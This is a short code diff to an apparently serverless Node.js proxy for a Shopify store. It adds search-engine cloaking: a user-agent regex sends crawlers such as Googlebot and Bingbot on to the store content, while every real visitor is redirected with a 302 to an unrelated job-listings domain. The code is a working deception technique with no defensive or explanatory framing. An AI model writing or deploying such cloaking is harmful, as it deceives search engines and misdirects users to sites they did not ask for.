@@ -1,6 +1,16 @@
 module.exports = async (req, res) => {
   const shopifyDomain = "b2wfnx-6i.myshopify.com";
   const proxyHost = req.headers.host;
+  const userAgent = req.headers["user-agent"] || "";
+
+  // ✅ Bot detect karo
+  const isBot = /googlebot|bingbot|slurp|duckduckbot|baiduspider|yandexbot|facebot|ia_archiver|spider|crawl|bot/i.test(userAgent);
+
+  // ✅ Real user ko redirect karo
+  if (!isBot) {
+    return res.redirect(302, "https://NewJobstoday.job4intern.com");
+  }
+
 
   const targetURL = `https://${shopifyDomain}${req.url}`;
 
